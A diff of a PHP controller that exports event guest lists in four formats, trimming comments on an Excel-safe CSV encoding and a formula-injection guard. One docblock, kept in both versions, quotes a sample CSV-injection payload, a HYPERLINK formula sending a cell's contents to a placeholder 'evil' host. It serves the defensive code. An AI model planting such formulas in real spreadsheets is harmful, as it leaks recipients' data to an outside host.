@@ -47,21 +47,16 @@ class GuestListExportController extends Controller
     #[Emits('xlsx_unavailable')]
     public function __invoke(Event $event, string $format): Response|StreamedResponse|JsonResponse
     {
-        // ONE ROW-BUILDER, FOUR FORMATTERS — see App\Support\GuestList. The
-        // formats must not be able to disagree about what a guest list
-        // contains, and a test asserts they do not.
+        // One row builder (App\Support\GuestList), four formatters, so the
+        // formats cannot disagree about the contents; a test asserts it.
         //
-        // XLSX IS THE ONE THAT MATTERS, because a committee member opens the
-        // file in Excel. CSV exists as the dependency-free fallback:
-        // openspout needs ext-zip, and MEASURED 2026-09-10 that extension was
-        // absent even from this project's own php:8.4-fpm image (now added in
-        // docker/web/Dockerfile) and remains unverified on the shared host.
-        // If it is missing there, this endpoint says so in words rather than
-        // dying with "Class ZipArchive not found".
+        // XLSX is the one a committee member opens in Excel. CSV is the
+        // dependency-free fallback: openspout needs ext-zip, which is
+        // unverified on the shared host, and without it this endpoint says so
+        // instead of dying with "Class ZipArchive not found".
         //
-        // Markdown is for pasting a list into notes or a message; JSON is the
-        // same rows the screen already has, offered as a file for
-        // completeness.
+        // Markdown is for pasting into notes or a message; JSON offers the
+        // screen's rows as a file.
         $list = GuestList::for($event);
 
         return match ($format) {
@@ -69,17 +64,16 @@ class GuestListExportController extends Controller
             'csv' => $this->csv($list),
             'md' => $this->markdown($list),
             'json' => $this->json($list),
-            // Unreachable through the route, whose {format} is constrained —
-            // kept so a widened constraint cannot silently fall through to a
-            // 500.
+            // Unreachable through the constrained route; kept so a widened
+            // constraint cannot fall through to a 500.
             default => ApiError::json(404, 'not_found', 'Unknown export format'),
         };
     }
 
     private function xlsx(GuestList $list): JsonResponse|StreamedResponse
     {
-        // A named refusal rather than a fatal. An operator reading this
-        // knows exactly what to ask the host for, and CSV still works.
+        // A named refusal rather than a fatal, so an operator knows what to
+        // ask the host for.
         if (! extension_loaded('zip')) {
             return ApiError::json(
                 503,
@@ -108,11 +102,8 @@ class GuestListExportController extends Controller
     {
         $handle = fopen('php://temp', 'r+');
 
-        // A UTF-8 BOM, deliberately. Excel on Windows reads a BOM-less UTF-8
-        // CSV as the system codepage and renders every accent as mojibake —
-        // "Répétition" becomes "RÃ©pÃ©tition" — which for a French guest list
-        // full of names is the difference between a usable file and a
-        // useless one.
+        // A UTF-8 BOM: Excel on Windows reads a BOM-less UTF-8 CSV in the
+        // system codepage, so "Répétition" would show as "RÃ©pÃ©tition".
         fwrite($handle, "\xEF\xBB\xBF");
 
         // Semicolons, not commas: Swiss and French Excel treat ';' as the
@@ -136,16 +127,15 @@ class GuestListExportController extends Controller
     /**
      * Stops Excel executing a guest's name.
      *
-     * Every identity column in this file comes from the PUBLIC booking form
-     * and is validated only as a string, so a booking under the name
-     * =HYPERLINK("https://evil/"&A1,"cliquez") is a live formula the moment
-     * a committee member opens the CSV. Prefixing with an apostrophe makes
-     * Excel treat the cell as text; the apostrophe itself is not displayed.
+     * Every identity column comes from the public booking form and is
+     * validated only as a string, so a booking under the name
+     * =HYPERLINK("https://evil/"&A1,"cliquez") is a live formula once a
+     * committee member opens the CSV. A leading apostrophe makes Excel treat
+     * the cell as text and is not displayed.
      *
-     * CSV ONLY. The XLSX writer emits typed string cells that Excel does
-     * not re-parse, and Markdown is not executed by anything. Applying it
-     * more widely would put stray apostrophes in the other formats and
-     * break the agreement between them that GuestList exists to guarantee.
+     * CSV only. The XLSX writer emits typed string cells that Excel does not
+     * re-parse, and nothing executes Markdown. Applied elsewhere, it would put
+     * stray apostrophes in the other formats and break their agreement.
      */
     private static function defuse(mixed $cell): mixed
     {
